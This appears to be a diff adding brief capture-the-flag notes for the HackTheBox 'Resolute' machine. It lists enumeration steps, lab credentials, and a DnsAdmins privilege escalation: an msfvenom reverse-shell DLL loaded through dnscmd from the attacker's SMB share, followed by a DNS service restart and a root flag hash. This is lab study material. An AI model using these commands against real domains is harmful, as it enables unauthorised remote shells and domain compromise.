@@ -1,0 +1,13 @@
+smbenum --->> users
+enum4linux --->> creds
+evil-winrm script --->> melanie : Welcome123! --->> user.txt
+get-childitem . -hidden or ls -force in root directory --->> PSTranscripts --->> creds --->> ryan : Serv3r4Admin4cc123!
+whoami /groups -->> checking group memberships -->> identified dnsadmin dll injection:
+setup impacket smbserver : smbserver.py pwned /root/Desktop/htb/htb-resolute/
+making connection with smbserver :  New-PSDrive -Name "hello_world" -PSProvider "FileSystem" -Root "\\10.10.14.13\pwned"
+creating dll : msfvenom -p windows/x64/shell_reverse_tcp -LHOST=<ip> LPORT=<port> -f dll > <filename>.dll
+injecting dll : dnscmd resolute /config /serverlevelplugindll \\10.10.14.13\pwned\hi.dll
+restarting dns service : sc.exe \\resolute stop dns --->> sc.exe \\resolute start dns
+catching shell with msfvenom
+
+root.txt --->> e1d94876a506850d0c20edb5405e619c
